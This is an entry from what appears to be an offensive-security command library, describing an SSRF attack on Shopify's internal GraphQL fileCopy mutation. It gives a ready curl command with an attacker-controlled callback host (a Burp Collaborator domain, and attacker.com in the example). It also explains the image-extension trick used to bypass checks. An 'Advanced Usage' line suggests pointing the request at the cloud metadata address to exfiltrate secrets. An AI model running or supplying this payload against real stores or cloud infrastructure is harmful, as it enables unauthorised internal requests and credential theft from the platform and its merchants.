---
data: >-
  curl -X POST 'https://storeA.myshopify.com/admin/internal/web/graphql/core' -H
  'Content-Type: application/json' -H 'X-Shopify-Access-Token: YOUR_STAFF_TOKEN'
  -d '{"query":"mutation fileCopy
  ($key:String!,$absoluteKey:String!,$path:String!){fileCopy
  (key:$key,path:$path,absoluteKey:$absoluteKey) {file{path} userErrors {field
  message}}}","variables":{"absoluteKey":"1.jpg","key":"1.jpg","path":"http://zdgrdgk8zi7sssw4axdoevuyup0poe.burpcollaborator.net/1.png"}}'
tags:
  - shopify
  - graphql
  - ssrf
type: command
executor: curl
platforms:
  - Web
  - Cloud
id: a7f63ab8-b59c-437d-9e38-72e52fc24c14
created_at: '2025-12-14T17:32:48.513Z'
updated_at: '2025-12-14T17:32:48.513Z'
verified: false
validated: true
submitted: true
---
# shopify-filecopy-mutation-for-ssrf

## Command

```bash
curl -X POST 'https://storeA.myshopify.com/admin/internal/web/graphql/core' \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Access-Token: YOUR_STAFF_TOKEN' \
  -d '{"query":"mutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {file{path} userErrors {field message}}}","variables":{"absoluteKey":"1.jpg","key":"1.jpg","path":"http://zdgrdgk8zi7sssw4axdoevuyup0poe.burpcollaborator.net/1.png"}}'
```

## Description

This curl command exploits the fileCopy GraphQL mutation for SSRF by setting path to an external URL and using image extensions for key/absoluteKey to bypass checks, causing the server to fetch the attacker-controlled endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://storeA.myshopify.com/admin/internal/web/graphql/core` | Target GraphQL endpoint | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload type | Yes |
| `-H 'X-Shopify-Access-Token: YOUR_STAFF_TOKEN'` | Authenticates with staff token | Yes |
| `-d '{...}'` | JSON payload with query and variables | Yes |
| `variables.absoluteKey` | Image extension (e.g., 1.jpg) to mimic valid file | Yes |
| `variables.key` | Image extension (e.g., 1.jpg) | Yes |
| `variables.path` | Arbitrary external URL for SSRF | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://example.myshopify.com/admin/internal/web/graphql/core' -H 'Content-Type: application/json' -H 'X-Shopify-Access-Token: token' -d '{"query":"...","variables":{"absoluteKey":"1.jpg","key":"1.jpg","path":"http://attacker.com/test.png"}}'
```

### Advanced Usage

Replace path with internal URLs (e.g., http://169.254.169.254) for metadata exfil if possible.

## Expected Output

JSON response possibly with errors, but external endpoint receives server request confirming SSRF (e.g., monitor Burp for interactions).

## Related

- [[commands/shopify-filecopy-mutation-for-file-copy]]
- [[procedures/Exploit-SSRF-via-fileCopy-with-External-URL]]
